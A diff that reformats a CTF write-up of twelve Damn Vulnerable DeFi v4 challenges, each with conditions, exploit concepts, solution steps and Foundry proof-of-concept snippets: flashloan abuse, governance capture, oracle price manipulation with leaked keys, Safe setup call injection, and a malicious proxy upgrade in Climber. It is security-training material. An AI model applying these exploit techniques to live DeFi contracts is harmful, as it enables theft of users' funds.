@@ -1,27 +1,29 @@
-Damn Vulnerable DeFi v4 Writeup
+# Damn Vulnerable DeFi v4 Writeup
 by tinamints
-1. Unstoppable
-conditions :
+
+## 1. Unstoppable
+### conditions :
 -  halt the vault
-concepts :
-    1. flashloan
-    2. DOS
-solution : 
+### concepts :
+-  flashloan
+-  DOS
+### solution : 
 - send token via 'deposit' function to make `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` true because totalSupply' only changes when someone send token via 'deposit function
-# POC
+### POC
 ` function test_unstoppable() public checkSolvedByPlayer {
         token.transfer(address(vault), 1);
     }
 `
-2. Naive receiver
-conditions : 
+
+## 2. Naive receiver
+### conditions :
 - rescue all funds in the flashloan pool
 - complete the challenge in less than 2 transactions
-concepts :
-    1. flashloan
-solution : 
+### concepts :
+-  flashloan
+### solution : 
 - set the reciever as the tarket to pay fee and imposonate the feeReceiver to withdraw the accumulated WETH 
-# POC
+### POC
 ` function test_naiveReceiver() public checkSolvedByPlayer {
     
         bytes[] memory data = new bytes[](10);
@@ -44,30 +46,30 @@ solution :
        
     }`
 
-3. Truster
-conditions :
-    1. rescue all funds to the recovery
-    2. complete the challenge with 1 transaction
-concepts :
-    1. flashloan
-    2. unchecked argument
-solution : 
+## 3. Truster
+### conditions :
+- rescue all funds to the recovery
+- complete the challenge with 1 transaction
+### concepts :
+-  flashloan
+-  unchecked argument
+### solution : 
 - set 'target'=pool and call 'approve' on it to approve the attacker on its token
-# POC
+### POC
 `function test_truster() public checkSolvedByPlayer {
         Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
         attacker.attack();
 
     }`
 
-4. Side Entrance
-conditions : 
-    1. rescue all funds and transfer to then recovery account with 1 ETH
-concepts :
-    1. flashloan with collateral
-solution :
+## 4. Side Entrance
+### conditions :
+- rescue all funds and transfer to then recovery account with 1 ETH
+### concepts :
+-  flashloan with collateral
+### solution :
 - take an advantage of  `execute` being called during the flashloan  to deposit to the pool and get `balance` and get the right to call `withdraw`
-# POC
+### POC
 ` function test_sideEntrance() public checkSolvedByPlayer {
         SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
 
@@ -77,16 +79,16 @@ solution :
 
 `
 
-5. The Rewarder
-conditions : 
-    1. save as much funds as possible and transfer to the recovery account
-    2. have to be in the beneficiaries to interact with the distributor
-concepts :
-    1. restricted distribution 
-    2. merkle tree system
-solutions :
+## 5. The Rewarder
+### conditions :
+- save as much funds as possible and transfer to the recovery account
+- have to be in the beneficiaries to interact with the distributor
+### concepts :
+-  restricted distribution 
+-  merkle tree system
+### solution :
 - take the advantage of the fact that the distributor doesn't check `claimRewards()` when claim the same token and claim the same token multiple times
-# POC
+### POC
 ` function test_theRewarder() public checkSolvedByPlayer {
         
         string memory dvtJson = vm.readFile(
@@ -162,15 +164,15 @@ solutions :
 
     }`
 
-6. Selfie
-conditions :
+## 6. Selfie
+### conditions :
 - drain all tokens from the pool to recovery
-concepts :
-    1. flashloan
-    2. governance voting power
-solution :
+### concepts :
+-  flashloan
+-  governance voting power
+### solution :
 - flashloan the pool tokens to temporarily gain majority voting power, queue `emergencyExit` as a governance action, repay the loan, wait 2 days, execute the action
-# POC
+### POC
 ` function test_selfie() public checkSolvedByPlayer {
         pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
         vm.warp(block.timestamp + 2 days);
@@ -178,17 +180,17 @@ solution :
     }
 `
 
-7. Compromised
-conditions :
+## 7. Compromised
+### conditions :
 - drain all ETH from exchange to recovery
 - player must not own any NFT
 - NFT price must remain unchanged
-concepts :
-    1. oracle price manipulation
-    2. leaked private keys
-solution :
+### concepts :
+-  oracle price manipulation
+-  leaked private keys
+### solution :
 - decode leaked private keys (from README hex strings) of 2 oracle sources, set NFT price to 0, buy for 1 wei, restore price to 999 ETH, sell NFT, send ETH to recovery
-# POC
+### POC
 ` function test_compromised() public checkSolved {
         vm.prank(source1); oracle.postPrice("DVNFT", 0);
         vm.prank(source2); oracle.postPrice("DVNFT", 0);
@@ -205,16 +207,16 @@ solution :
     }
 `
 
-8. Puppet
-conditions :
+## 8. Puppet
+### conditions :
 - drain all 100k DVT from lending pool to recovery
 - complete in 1 transaction
-concepts :
-    1. Uniswap V1 oracle price manipulation
-    2. EIP-2612 permit
-solution :
+### concepts :
+-  Uniswap V1 oracle price manipulation
+-  EIP-2612 permit
+### solution :
 - dump player's 1000 DVT into Uniswap V1 to crash the token price, making `calculateDepositRequired` near zero, then borrow all pool tokens in 1 tx using permit for token approval
-# POC
+### POC
 ` function test_puppet() public checkSolvedByPlayer {
         PuppetPoolAttacker attacker = new PuppetPoolAttacker(
             address(token), address(lendingPool), address(uniswapV1Exchange), recovery
@@ -224,15 +226,15 @@ solution :
     }
 `
 
-9. Puppet V2
-conditions :
+## 9. Puppet V2
+### conditions :
 - drain all 1M DVT from lending pool to recovery
-concepts :
-    1. Uniswap V2 oracle price manipulation
-    2. WETH collateral
-solution :
+### concepts :
+-  Uniswap V2 oracle price manipulation
+-  WETH collateral
+### solution :
 - sell all 10k player tokens into Uniswap V2 to crash DVT price, then borrow 1M pool tokens with the now-minimal WETH collateral required
-# POC
+### POC
 ` function test_puppetV2() public checkSolvedByPlayer {
         token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
@@ -244,16 +246,16 @@ solution :
     }
 `
 
-10. Free rider
-conditions :
+## 10. Free rider
+### conditions :
 - drain all 6 NFTs from marketplace
 - player earns the bounty (45 ETH)
-concepts :
-    1. Uniswap V2 flashloan
-    2. NFT marketplace buy logic bug
-solution :
+### concepts :
+-  Uniswap V2 flashloan
+-  NFT marketplace buy logic bug
+### solution :
 - flashloan 15 ETH (price of 1 NFT). marketplace bug: only checks `msg.value >= price` once but allows buying all 6, and sends ETH to the buyer instead of the seller. buy all 6 for 15 ETH, transfer to recoveryManager to claim 45 ETH bounty
-# POC
+### POC
 ` function test_freeRider() public checkSolvedByPlayer {
         flashLoanUser attacker = new flashLoanUser(
             address(marketplace), address(recoveryManager), address(nft),
@@ -263,16 +265,16 @@ solution :
     }
 `
 
-11. Backdoor
-conditions :
+## 11. Backdoor
+### conditions :
 - drain all 40 DVT to recovery
 - complete in 1 transaction
-concepts :
-    1. Safe proxy factory
-    2. arbitrary call injection during setup
-solution :
+### concepts :
+-  Safe proxy factory
+-  arbitrary call injection during setup
+### solution :
 - use `createProxyWithCallback`'s `initializer` field to inject an `approve` call during Safe's `setup()`. WalletRegistry sends 10 DVT to the new wallet, attacker immediately `transferFrom` the tokens. repeat for all 4 users
-# POC
+### POC
 ` function test_backdoor() public checkSolvedByPlayer {
         new Attacker(
             address(walletFactory), address(singletonCopy),
@@ -281,15 +283,15 @@ solution :
     }
 `
 
-12. Climber
-conditions :
+## 12. Climber
+### conditions :
 - drain all 10M DVT from vault to recovery
-concepts :
-    1. timelock execute-before-schedule bug
-    2. UUPS proxy upgrade
-solution :
+### concepts :
+-  timelock execute-before-schedule bug
+-  UUPS proxy upgrade
+### solution :
 - `execute()` runs actions before checking if they're scheduled. execute a batch: set delay to 0, grant proposer role to attacker, upgrade vault to malicious impl, retroactively `schedule` the batch from inside the callback. then call `sweepFunds` on the upgraded vault
-# POC
+### POC
 ` function test_climber() public checkSolvedByPlayer {
         MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
         ClimberAttack attackContract = new ClimberAttack(
